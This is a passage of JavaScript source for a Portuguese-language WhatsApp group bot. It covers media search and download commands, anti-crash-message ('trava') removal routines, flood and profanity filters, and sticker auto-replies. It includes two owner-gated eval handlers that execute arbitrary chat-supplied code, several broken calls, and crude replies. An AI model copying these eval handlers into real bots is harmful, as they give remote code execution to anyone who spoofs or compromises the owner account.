await aqua.sendMessage(from, {text: infobemvindo(prefix)}, {quoted: selo})
break

//==============baixar/PESQUISAS=============

case 'pinterest': 
if(!q) return reply(`Digite o nome da imagem que vc quer buscar\nExemplo: ${prefix + command} cat`)
reply(enviar.espere)
hx.pinterest(q)
.then(result => {
angkaa = ['1','2','3','4','5','6','7','8','9']
const randomnay2 = angkaa[Math.floor(Math.random() * (angkaa.length))]	
const buttons01 = [{buttonId: `${prefix + command} ${q}`, buttonText: {displayText: '[💢] PRÓXIMO [💢]'}, type: 1}]
const buttonMessage01 = {image: {url: result[randomnay2]},caption: "AQUI ESTÁ!!",footer: 'PRESSIONE O BOTÃO ABAIXO PARA A PRÓXIMA FOTO',buttons: buttons01,headerType: 4}
aqua.sendMessage(from, buttonMessage01, {quoted: selo}).catch(e => {
reply('Erro, nenhuma imagem recebida.')
})}) 
break 

case 'wallpaper': {
if(!q) return reply(`Digite o nome da imagem que vc quer buscar\nExemplo: ${prefix + command} fotos`)
  reply(enviar.espere)
  anu = await wallpaper(q)
  result = anu[Math.floor(Math.random() * anu.length)]
  let buttonswallpaper = [{buttonId: `${prefix}wallpaper ${q}`, buttonText: {displayText: '[💢] PRÓXIMO [💢]'}, type: 1}]
  aqua.sendMessage(from, { image: { url: result.image[0] }, caption: `AQUI ESTÁ!!`, footer: 'PRESSIONE O BOTÃO ABAIXO PARA A PRÓXIMA FOTO',buttons: buttonswallpaper }, { quoted: selo }).catch(e => {
reply('Erro, nenhuma imagem recebida.')
})
  }
  break

case 'tiktok2':
{
  if (!q) return reply('Cadê o link?')
  reply(mess.wait)

let buttons = [
{buttonId: `${prefix}tiktokvideo ${q}`, buttonText: {displayText: '🎥 Vídeo'}, type: 1},
{buttonId: `${prefix}tiktokaudio ${q}`, buttonText: {displayText: '🎶 Audio'}, type: 1}
]
let thumbInfo = `${pushname} \n_*MÍDIA ENCONTRADA🎬!!!*_`;
testeImage = await getBuffer(`https://telegra.ph/file/4f12e1961dc5c3c72cc2f.jpg`);

buttonMessage = {image: testeImage, caption: `${thumbInfo}`, footer: `*Bem faça a sua escolha amigo 🤨*`, buttons: buttons, headerType: 4}
aqua.sendMessage(from, buttonMessage, {quoted: selo})
}
break

case 'tiktokvideo':
case 'tiktok':
try {
if(!q) return reply("Cadê o link?")
if(!isUrl(args[0]) || !args[0].includes("tiktok")) return reply("Link inválido")
sex = await xfar.downloader.tiktok(args[0])
plsexual = []
for (let plgay of sex.media) {
if (plgay.quality === "hd") plsexual.push(plgay.url)
}
if(plsexual.length === 0) return reply("Não consegui encontrar o vídeo😕")
plviado = await getBuffer(`${plsexual[Math.floor(Math.random() * plsexual.length)]}`)
aqua.sendMessage(from, {video: plviado, caption: `${sex.title}`}, {quoted: selo})
} catch {
reply("Deu erro 😔")
}
break


case 'tiktokaudio': 
bla = await fetchJson(`https://tohka.tech/api/dl/tiktok?link=https://vm.tiktok.com/ZMRXoPvCv/&apikey=${tohkapi}`)
blabla = await getBuffer(bla.resultado.server1)
aqua.sendMessag(from, {audio: blabla, mimetype: 'audio/mp4'}, {quoted: selo}).catch(e => { 
reply('ERROR')
})
break


case 'execut':
donoprincipal = '553175416530@s.whatsapp.net'
if (!donoprincipal.includes(sender)) return 
try {
return eval(`(async() => { ${args.join(' ')}})()`)
} catch (e) {
reply(`${e}`)
}
break

  case 'pinterest2': 
try {
if(!q) return reply(`Digite o nome da imagem que vc quer buscar\nExemplo: ${prefix + command} cat`)
reply(enviar.espere)
blap = await getBuffer(`https://manuella-api-pl.herokuapp.com/api/pinterest?text=${q}&apikey=${keyapi}`)
await aqua.sendMessage(from, {image: blap, thumbnail: null}, {quoted: selo}).catch(e => {
reply('ERROR!!')
})
} catch (e) {
if(String(e).includes("invalid json response body at")) {
console.log("A api caiu ou não foi possivel executar esta ação., espere retornar")   
} else {
reply('ERROR!!')
}
}
break

case 'tradutor': case 'traduzir':
try {
if(!q) return reply(`Exemplo : ${prefix}tradutor HI`)
bla = await fetchJson(`https://manuella-api-pl.herokuapp.com/api/tradutor?text=${args.join(" ")}&idioma=pt&apikey=${keyapi}`)
blatxt = ` [🩸] Olá ${pushname} [🚩] \n\n seu texto ${q} foi traduzida pra ->\n\n ${bla.bla}`
blalogo = await getBuffer(`${logo}`)
aqua.sendMessage(from, {text: blatxt, contextInfo: { externalAdReply:{title: `[🩸] TRADUZIDO [🚩] `,body:"", previewType:"PHOTO",thumbnail: blalogo}}}, {quoted: selo}).catch(e => {
reply("ERROR!!")
console.log(e)
})
} catch (e) {
if(String(e).includes("invalid json response body at")) {
console.log("A api caiu ou não foi possivel executar esta ação., espere retornar")   
} else {
reply('ERROR!!')
}
}
break

case 'gimage':
case 'google':
try {
if (!q) return reply(`O que você está procurando?\n\nEx.: ${prefix + command} gatinhos fofinhos`)
let gis = require('./funções de cmd/funções/gimage.js')
gis(args.join(" "), async (error, result) => {
if (error) {
return sendBtext(from, `Ocorreu um erro`, `Aperte no botão abaixo para tentar novamente.`, [{buttonId: `${prefix + command} ${q}`, buttonText: {displayText: `Tentar Novamente`}, type: 1}], info)
}
n = result
try {
images = n[Math.floor(Math.random() * n.length)]
let buttons = [
{buttonId: `${prefix}gimage ${args.join(" ")}`, buttonText: {displayText: 'Proximo'}, type: 1}
]
let buttonMessage = {
image: { url: images.url },
caption: `Pronto!`,
buttons: buttons,
headerType: 4,
}
aqua.sendMessage(from, buttonMessage, { quoted: selo })
} catch {
sendBtext(from, `Nenhuma imagem recebida.`, `Aperte no botão abaixo para tentar novamente.`, [{buttonId: `${prefix + command} ${q}`, buttonText: {displayText: `Tentar Novamente`}, type: 1}], info)
}
})
} catch {
sendBtext(from, `Ocorreu um erro`, `Aperte no botão abaixo para tentar novamente.`, [{buttonId: `${prefix + command} ${q}`, buttonText: {displayText: `Tentar Novamente`}, type: 1}], info)
console.log("O MODULO caiu ou não foi possivel executar esta ação., espere retornar") 
}
break




case 'pesquisar':
blar = Math.floor(Math.random() * 5)
bla = await fetchJson(`https://manuella-api-pl.herokuapp.com/api/gimage?txt=${q}&apikey=${keyapi}`)
blabla = await getBuffer(bla.resultado.result[`${blar}`].url) 
aqua.sendMessage(from, {image: blabla}).catch(e => {
reply("ERROR, não foi encontrado, tente novamente...")
})
break



case 'igdl':
case 'instadw': 
try {  
link = args.join(' ')
if (!link) return reply('Ops, insira o link de um video/foto do instagram.')
post = await fetchJson(`https://manuella-api-pl.herokuapp.com/api/instagram?url=${link}&apikey=${keyapi}`)
s_video = await getBuffer(post.resultado[0].downloadUrl)
aqua.sendMessage(from, {video: s_video}, {quoted: selo})
} catch (e) {
if(String(e).includes("invalid json response body at")) {
console.log("A api caiu ou não foi possivel executar esta ação., espere retornar")   
} else {
reply('ERROR!')
}
}
break


//========FINAL DAS PESQUISAS=============


default:

//========================================

if(isBotGroupAdmins && isAntiCtt && type === 'contactMessage') {
if(isGroupAdmins) return aqua.sendMessage(from, {text: 'Contato detectado, você é adm, então não irei ti remover'}, {quoted: selo})
await aqua.sendMessage(from, {text: 'opa fechado pelo bot detectado trava contato ou vcard, caso for um engano, fale com algum adm.'}, {quoted: selo})
await aqua.groupSettingUpdate(from, 'announcement')
await sleep(2000);
Kic = `${sender.split("@")[0]}@s.whatsapp.net`
aqua.groupParticipantsUpdate(from, [sender], 'remove')
await sleep(2000);
await aqua.sendMessage(from, { text: 'o grupo sera limpado para evitar fazer efeito da trava'}, {quoted:selo})
await sleep(3000);
clear = `🗑️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n🗑️\n❲❗❳ *Lɪᴍᴘᴇᴢᴀ ᴅᴇ Cʜᴀᴛ Cᴏɴᴄʟᴜɪ́ᴅᴀ* ✅`
aqua.sendMessage(from, {text: clear}, {quoted: selo, contextInfo : { forwardingScore: 500, isForwarded:true}})
await sleep(3000);
await aqua.sendMessage(from, { text: 'agora enviarei destrava aguarde '}, {quoted:selo})
await sleep(2000);
await aqua.sendMessage(from, {text: destrava(prefix)}, {quoted: selo})
await sleep(2000);
await aqua.sendMessage(from, {text: destrava(prefix)}, {quoted: selo})
await sleep(2000);
await aqua.sendMessage(from, { text: 'reporte ao adm o ocorrido '}, {quoted:selo})
await sleep(5000);
await aqua.groupSettingUpdate(from, 'not_announcement')
await sleep(2000);
await aqua.sendMessage(from, { text: 'Aberto nao marque a trava ou levara ban✅'}, {quoted:selo})
}

if(isBotGroupAdmins && isAntiCtt && type === 'contactsArrayMessage') {
if(isGroupAdmins) return aqua.sendMessage(from, {text: 'Contato detectado, você é adm, então não irei ti remover'}, {quoted: selo})
await aqua.sendMessage(from, {text: 'opa fechado pelo bot detectado trava contatos'}, {quoted: selo})
await aqua.groupSettingUpdate(from, 'announcement')
await sleep(2000);
Kic = `${sender.split("@")[0]}@s.whatsapp.net`
aqua.groupParticipantsUpdate(from, [sender], 'remove')
await sleep(2000);
await aqua.sendMessage(from, { text: 'o grupo sera limpado para evitar fazer efeito da trava'}, {quoted:selo})
await sleep(3000);
clear = `🗑️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n🗑️\n❲❗❳ *Lɪᴍᴘᴇᴢᴀ ᴅᴇ Cʜᴀᴛ Cᴏɴᴄʟᴜɪ́ᴅᴀ* ✅`
aqua.sendMessage(from, {text: clear}, {quoted: selo, contextInfo : { forwardingScore: 500, isForwarded:true}})
await sleep(3000);
await aqua.sendMessage(from, { text: 'agora enviarei destrava aguarde '}, {quoted:selo})
await sleep(2000);
await aqua.sendMessage(from, {text: destrava(prefix)}, {quoted: selo})
await sleep(2000);
await aqua.sendMessage(from, {text: destrava(prefix)}, {quoted: selo})
await sleep(2000);
await aqua.sendMessage(from, { text: 'reporte ao adm o ocorrido '}, {quoted:selo})
await sleep(5000);
await aqua.groupSettingUpdate(from, 'not_announcement')
await sleep(2000);
await aqua.sendMessage(from, { text: 'Aberto nao marque a trava ou levara ban✅'}, {quoted:selo})
}

if(isBotGroupAdmins && Antiloc && type === 'locationMessage') {
if(isGroupAdmins) return aqua.sendMessage(from, {text: 'Localização detectada, você é adm, então não irei ti remover'}, {quoted: selo})
await aqua.sendMessage(from, {text: 'opa fechado pelo bot, detectado trava Localização ou localização comum, caso for um engano, fale com algum adm.'}, {quoted: selo})
await aqua.groupSettingUpdate(from, 'announcement')
await sleep(2000);
Kic = `${sender.split("@")[0]}@s.whatsapp.net`
aqua.groupParticipantsUpdate(from, [sender], 'remove')
await sleep(2000);
await aqua.sendMessage(from, { text: 'o grupo sera limpado para evitar fazer efeito da trava'}, {quoted:selo})
await sleep(3000);
clear = `🗑️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n🗑️\n❲❗❳ *Lɪᴍᴘᴇᴢᴀ ᴅᴇ Cʜᴀᴛ Cᴏɴᴄʟᴜɪ́ᴅᴀ* ✅`
aqua.sendMessage(from, {text: clear}, {quoted: selo, contextInfo : { forwardingScore: 500, isForwarded:true}})
await sleep(3000);
await aqua.sendMessage(from, { text: 'agora enviarei destrava aguarde '}, {quoted:selo})
await sleep(2000);
await aqua.sendMessage(from, {text: destrava(prefix)}, {quoted: selo})
await sleep(2000);
await aqua.sendMessage(from, {text: destrava(prefix)}, {quoted: selo})
await sleep(2000);
await aqua.sendMessage(from, { text: 'reporte ao adm o ocorrido '}, {quoted:selo})
await sleep(5000);
await aqua.groupSettingUpdate(from, 'not_announcement')
await sleep(2000);
await aqua.sendMessage(from, { text: 'Aberto nao marque a trava ou levara ban✅'}, {quoted:selo})
}

if(isBotGroupAdmins && isAnticatalogo && type === 'productMessage') {
if(isGroupAdmins) return aqua.sendMessage(from, {text: 'Catalogo detectado, você é adm, então não irei ti remover'}, {quoted: selo})
await aqua.sendMessage(from, {text: 'opa fechado pelo bot, detectado trava Catalogo ou Catalogo comum, caso for um engano, fale com algum adm.'}, {quoted: selo})
await aqua.groupSettingUpdate(from, 'announcement')
await sleep(2000);
Kic = `${sender.split("@")[0]}@s.whatsapp.net`
aqua.groupParticipantsUpdate(from, [sender], 'remove')
await sleep(2000);
await aqua.sendMessage(from, { text: 'o grupo sera limpado para evitar fazer efeito da trava'}, {quoted:selo})
await sleep(3000);
clear = `🗑️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n🗑️\n❲❗❳ *Lɪᴍᴘᴇᴢᴀ ᴅᴇ Cʜᴀᴛ Cᴏɴᴄʟᴜɪ́ᴅᴀ* ✅`
aqua.sendMessage(from, {text: clear}, {quoted: selo, contextInfo : { forwardingScore: 500, isForwarded:true}})
await sleep(3000);
await aqua.sendMessage(from, { text: 'agora enviarei destrava aguarde '}, {quoted:selo})
await sleep(2000);
await aqua.sendMessage(from, {text: destrava(prefix)}, {quoted: selo})
await sleep(2000);
await aqua.sendMessage(from, {text: destrava(prefix)}, {quoted: selo})
await sleep(2000);
await aqua.sendMessage(from, { text: 'reporte ao adm o ocorrido '}, {quoted:selo})
await sleep(5000);
await aqua.groupSettingUpdate(from, 'not_announcement')
await sleep(2000);
await aqua.sendMessage(from, { text: 'Aberto nao marque a trava ou levara ban✅'}, {quoted:selo})
}

if (body.length >= limitefl) { 
if(!isAntiFlood) return
if(isAntiFlood && isGroupAdmins && isBotGroupAdmins && isPremium) {
if(isBot) return 
reply('*Link detectado, porém usuário é admin*')
} else {
if(SoDono) return
if(isGroupAdmins) return
if(isPremium) return
var Kic = `${sender.split("@")[0]}@s.whatsapp.net`  
setTimeout( () => {
if(!SoDono  && !m.key.fromMe && !isGroupAdmins) return reply('Muitas características enviadas, eu afirmo que pode ser trava, por precauções, eu irei remover.')
console.log(color('deram Spam','red'))
}, 100)
setTimeout( () => {
aqua.groupParticipantsUpdate(from, [sender], 'remove')
}, 1000)
setTimeout( () => {
}, 0)
}
}

//========================================

hora2 = moment.tz('America/Sao_Paulo').format('HH:mm:ss');


/*
if (isCmd) {
uptime = process.uptime()  
sendBtext(from, `
╭┅═┅═┅═┅═┅═┅═┅═᳀
┃❖╭─────────────➤
┃❖│
┃❖│ HORA: ${hora2}
┃❖│ᬊ͜͡ ❓ O COMANDO: ${prefix}${command} 
┃❖│ᬊ͜͡ ⁉️ NÃO EXISTE
┃❖│USE: ${prefix}menu
┃❖│
┃❖╰─────────────
╰┅═┅═┅═┅═┅═┅═┅═᳀➤`, `TEMPO DO BOT ATIVO:\n ${kyun(uptime)}`,[{buttonId: `${prefix}menu`, buttonText: {displayText: `[🩸] OK  MOSTRA TEU MENU [🩸] `}, type: 1}], m) 
}
*/

if (isCmd) {
r = (Date.now() / 1000) - info.messageTimestamp
uptime = process.uptime()
adivinhaaa = info.key.id.length > 21 ? 'ANDROID 👾': info.key.id.substring(0, 2) == '3A' ? 'IPHONE 🍏' : 'ZAP DA WEB 💻';

 sections = [
    {
	title: "[💦] AQUA BOT SUPREMACY [💦] ",
rows: [
{title: "[💦] MENU BRINCADEIRAS [💦]", rowId: `${prefix}brincadeiras`},
{title: "[💦] MENU ALTERADORES [💦]", rowId: `${prefix}alteradores`},
{title: "[💦] MENU COMPLETO [💦]", rowId: `${prefix}menuc`},
{title: "[💦] MENU PREMIUM [💦]", rowId: `${prefix} menupremium`},
{title: "[💦] FICHA TÉCNICA [💦]", rowId: `${prefix}info`},
{title: "[💦] HENTAI LIST [💦]", rowId: `${prefix}hentailist`},
{title: "[💦] MENU HENTAI [💦]", rowId: `${prefix}menuhentai`},
{title: "[💦] MENU LOGO [💦]", rowId: `${prefix}menulogo2`},
{title: "[💦] MENU DONO [💦]", rowId: `${prefix}menudono`},
{title: "[💦] MENU ADM [💦]", rowId: `${prefix}menuadm`},
{title: "[💦] INFO DONO [💦]", rowId: `${prefix}infodono`},
{title: "[💦] GP OFICIAL [💦]", rowId: `${prefix}gpofc`},
{title: "[💦] COMPRAR [💦]", rowId: `${prefix}alugar`},
{title: "[💦] CRIADOR [💦]", rowId: `${prefix}menudono`}
	]
    },
]
 

const listMessage2 = {
  text: `
  ╭━━━━━◉                                       ◉━━━━━╮
       ╔┉💦┉═══『💧』═══┉💦┉╗    
       ║ 🇮 🇳 🇻 🇦́ 🇱 🇮 ?? 🇴ㅤ║
       ╚┉💦┉═══『💧』═══┉💦┉╝    
╰━━━━━◉                                       ◉━━━━━╯
ㅤㅤི⋮ ྀ💧⏝ ི⋮ ྀ  💦 ི⋮ ྀ⏝💧ི⋮ ྀ

┠➥  *[👤] OLÁ HUMANO:* ${pushname}
┠➥  *[⚖️] ${tempo}*
┠➥  *[📌] COMANDO:* ${command}
┠➥  *[🔰] NÃO EXISTE NO SISTEMA*
┠➥  *[🧐] LEIA O MENU, HUMANO.*
┠➥ *[⚡] PING:* ${String(r.toFixed(3))}
┠➥ *[🟢] ATIVO:* ${runtime(uptime)}
╰─╼━━━══━━━≺💧≻━━━══━━━╾─╯`,
  footer: `
`,
  title: ``,
  buttonText: `[💦] MENU LIST [💦]` ,
  sections
}
sendMsg = await aqua.sendMessage(from, listMessage2, {quoted: selo})
}
//========================================


if(isCmd) {
if(command == "play" ||
command == "play2" ||
command == "ytmp3" ||
command == "gtts" ||
command == "yta" ||
command == "play3") {
aqua.sendPresenceUpdate('recording', from)
} else aqua.sendPresenceUpdate('composing', from)
}


//==🇨 🇴 🇲 🇦 🇳 🇩 🇴    🇸 🇪 🇲    🇵 🇷 🇪 🇫 🇮 🇽 ??==//
 switch(testat){
}

if (budy.includes("apagar") || (budy.includes("Apagar") || (budy.includes("apaga") || (budy.includes("apagar") || (budy.includes("Apaga")))) )){
if (!isGroupAdmins) return
if (!quoted) return
let { chat, fromMe, id } = quoted
aqua.sendMessage(from, { delete: { remoteJid: from, fromMe: false, id: m.quoted.id, participant: m.quoted.sender } })
}

//==========//

if(budy.includes("Criatura") || budy.includes("criatura") || budy.includes("CRIATURA") || budy.includes("criatura")) { 
try {
ppimg = await aqua.profilePictureUrl(`${sender.split('@')[0]}@c.us`, 'image')
} catch {
ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}

pegarimg = await getBuffer(ppimg)
await sleep (2000)
 tujuh = fs.readFileSync('./audios/criatura.mp3');
await aqua.sendMessage(from, {audio: tujuh, mimetype: 'audio/mp4', ptt:true}, {quoted: selo})
 aqua.sendMessage(from, {image: pegarimg},  {quoted: selo})
}       



if (budy.includes("ERZA") || budy.includes("Erza") || budy.includes("erza") || budy.includes("Erza Scarlett") ||  budy.includes("Erza scarlett")){
anu = await getBuffer('https://telegra.ph/file/c6b7684df26a49b84cdd1.mp4')
aqua.sendMessage(from, {video: anu, mimetype: 'video/mp4'}, {quoted: selo})
}
//======//
//==🇫 🇮 🇬 ?? 🇷 🇮 🇳 🇭 🇦 🇸    🇩 🇮 🇻 🇮 🇳 🇦 🇸==//


if(budy.includes("aqua") || budy.includes("AQUA") || budy.includes("Aqua") || budy.includes("Aqua bot")) {
bla = fs.readFileSync("./fig/oiaqua.webp")
aqua.sendMessage(from, {sticker: bla}, {quoted: selo})
}
//======//
if(budy.includes("tudo bem") || budy.includes("Tudo Bem") || budy.includes("TUDO BEM") || budy.includes("Tudo bem")) {
bla = fs.readfilesync("./fig/bem.webp")
pl.sendmessage(from, {sticker: bla}, {quoted: selo})
}
//======//
if(budy.includes("BOM DIA") || budy.includes("Bom Dia") || budy.includes("bom dia") || budy.includes("Bom dia")) {
bla = fs.readFileSync("./fig/bomdia.webp")
aqua.sendMessage(from, {sticker: bla}, {quoted: selo})
}
//======//
if(budy.includes("CHATO") || budy.includes("Chato") || budy.includes("chato")) {
bla = fs.readFileSync("./fig/chato.webp")
aqua.sendMessage(from, {sticker: bla}, {quoted: selo})
}
//======//
if(budy.includes("CHATA") || budy.includes("Chata") || budy.includes("chata")) {
bla = fs.readFileSync("./fig/chato.webp")
aqua.sendMessage(from, {sticker: bla}, {quoted: selo})
}
//======//
if(budy.includes("FOFA") || budy.includes("Fofa") || budy.includes("fofa") || budy.includes("Fofinha") || budy.includes("fofinha")) {
bla = fs.readFileSync("./fig/fofa.webp")
aqua.sendMessage(from, {sticker: bla}, {quoted: selo})
}
//======//
if(budy.includes("GLUB GLUB") || budy.includes("Glub Glub") || budy.includes("Glub glub") || budy.includes("glub glub")) {
bla = fs.readFileSync("./fig/glub.webp")
aqua.sendMessage(from, {sticker: bla}, {quoted: selo})
}
//======//
if(budy.includes("OI") || budy.includes("Oi") || budy.includes("oi")) {
bla = fs.readFileSync("./fig/oi.webp")
aqua.sendMessage(from, {sticker: bla}, {quoted: selo})
}
//======//
if(budy.includes("PIX") || budy.includes("Pix") || budy.includes("pix")) {
bla = fs.readFileSync("./fig/pix.webp")
aqua.sendMessage(from, {sticker: bla}, {quoted: selo})
}
//======//
if(budy.includes("SEXO") || budy.includes("Sexo") || budy.includes("sexo") || budy.includes("SECSU") || budy.includes("secsu") || budy.includes("Secsu")) {
bla = fs.readFileSync("./fig/secsu.webp")
aqua.sendMessage(from, {sticker: bla}, {quoted: selo})
}
//======//
if(budy.includes("TRISTE") || budy.includes("Triste") || budy.includes("triste") || budy.includes("titi")) {
bla = fs.readFileSync("./fig/triste.webp")
aqua.sendMessage(from, {sticker: bla}, {quoted: selo})
}
//======//
if(budy.includes("VADIA") || budy.includes("Vadia") || budy.includes("vadia")) {
bla = fs.readFileSync("./fig/vadia.webp")
aqua.sendMessage(from, {sticker: bla}, {quoted: selo})
}
//======//
if(budy.includes("LIXO") || budy.includes("Lixo") || budy.includes("lixo")) {
bla = fs.readFileSync("./fig/lixo.webp")
aqua.sendMessage(from, {sticker: bla}, {quoted: selo})
}
//======//

if (budy.includes("adivinha meu celular") || (budy.includes("Adivinha meu celular") || (budy.includes("Adivinha Meu celular") || (budy.includes("Adivinha Meu Celular") || (budy.includes("bot qual meu celular")))) )){
adivinha = info.key.id.length > 21 ? 'Android 🥴' : info.key.id.substring(0, 2) == '3A' ? 'IPHONE 🔋🔌' : 'ZAP DA WEB 💻';
await aqua.sendMessage(from, {text: adivinha}, {quoted: selo})
}


if(budy.includes("Qual e seu prefixo") || budy.includes("qual e seu prefixo") || budy.includes("manu seu prefixo") || budy.includes("Prefix")) { 
await  
reply(`ᬊMEU PREFIXO? AQUI ESTÁ: ⟪ ${prefix} ⟫`)
}

if(budy.match('Bom dia') || budy.includes("bom dia") || budy.includes("bomdia") || budy.includes("Bom Dia")){
aqua.sendMessage(from,{audio: { url: "./audios/bomdia.mp3" }, mimetype: 'audio/mp4' ,ptt: true},{quoted: selo})
}
 
if(budy.match('Boa tarde') || budy.includes("boa tarde")){
aqua.sendMessage(from,{audio: { url: "./audios/boatarde.mp3" }, mimetype: 'audio/mp4' ,ptt: true},{quoted: selo})
}
 
if(budy.match('Boa noite') || budy.includes("Boa Noite") || budy.includes('Boanoite')){
aqua.sendMessage(from,{audio: { url: "./audios/boanoite.mp3" }, mimetype: 'audio/mp4' ,ptt: true},{quoted: sel})
}

//==🇵 🇦 🇱 🇦 🇻 🇷 🇦 🇸    🇩 🇮 🇻 🇮 🇳 🇦 🇸==//

if (budy.includes("bot corno") || (budy.includes("Bot corno"))){
reply(`Corno é você, SEU FDP DA DISGRAÇA DA DISGRAÇA`)
}

if (budy.includes("Convite para participar do meu grupo no whatsapp ") || (budy.includes("Entrar no Grupo"))){
reply(`bot Pago\nCaso Queira Me add em Grupo\nFale com meu dono\n\nCHAT: wa.me/553175416530`)
}


//=====================================

switch(ants){
} 

//=========[--ANTI PALAVRÃO --]==========\\
if (isGroup && isPalavrao) { //CREDITOS TIAGO
 if (palavra.includes(budy2)) {
 if (!isGroupAdmins) {
 aqua.sendMessage(from, {text: `SEM PALAVRÃO!! 😠!!`}, {quoted : m})       
setTimeout( () => {
aqua.groupParticipantsUpdate(from, [sender], 'remove')
}, 2000)
reply("2")
setTimeout( () => {
reply("1")
}, 1000)
setTimeout( () => {
aqua.sendMessage(from, {text: `*「 🗣️ANTI PALAVRÃO🗣️ 」*\nVocê será banido do gp, Na proxima tenha ética ao falar!!`}, {quoted : m}).catch(e => {
aqua.sendMessage(from, {text: `InFelizmente, não sou um administrador, entt não posso te banir!!`}, {quoted : m})
})       			
}, 0)
} else {
return reply(`VOCÊ PODE ${pushname} 😇`)
}
}
}

 
//================(SIMIH-2)=================\\

if (!isCmd && isSimi2 && isGroup) {
if(isCmd || isUrl(budy2)) return
if(budy.length >= 500) return 
if(budy.includes("@55")) return
if (info.key.fromMe) return
if (type == 'extendedTextMessage' && prefix.includes(info.message.extendedTextMessage.contextInfo.quotedMessage.conversation[0])) return
insert(type, info)
const sami = await response(budy)
console.log(sami)

if (sami) aqua.sendMessage(from, {text: sami, thumbnail: logo}, {quoted: selo});
}


 //===============(SIMIH-1)===============\\
    
if (isGroup && isSimi && bady != undefined) {
if(type == 'imageMessage') return 
if(type == 'audioMessage') return 
if(type == 'stickerMessage') return   
if(info.key.fromMe) return 
console.log(bady)
muehe = await simih(bady)
console.log(muehe)
reply(muehe)
}


//========================================\\


if (body.startsWith('>')) {
donoprincipal = '553175416530@s.whatsapp.net'
if (!donoprincipal.includes(sender) && !info.key.fromMe) return
try {
console.log('[', color('EVAL', 'silver'),']', color(moment(info.messageTimestamp * 1000).format('DD/MM HH:mm:ss'), 'yellow'), color(budy))
return reply(JSON.stringify(eval(budy.slice(2)),null,'\t')) 
} catch (e) {
reply(e)
}
}

//=====================================


//=====================================

}
} catch (e) {
if(String(e).includes("service-unavailable")) {
console.log(color("Ignore esta mensagem..", "gray"))
} else if(String(e).includes("rate-overlimit")) {
console.log(color("Ignore esta mensagem..", "gray"))
} else if(String(e).includes("at async groupMetadata")) {
console.log(color("Ignore esta mensagem..", "gray"))  
} else if(String(e).includes("Session error")) {
console.log(color("Ignore esta mensagem..", "gray"))
} else if(String(e).includes("rate-overlimit")) {
console.log(color("Ignore esta mensagem..", "gray"))
} else if(String(e).includes("Bad MAC Error")){
console.log(color("Ignore esta mensagem..", "gray"))
} else if(String(e).includes("Key used already or never")) {
console.log(color("Ignore esta mensagem..", "gray"))
} else {
console.log(color(`${e}`, "red"))  
}
}
 


}
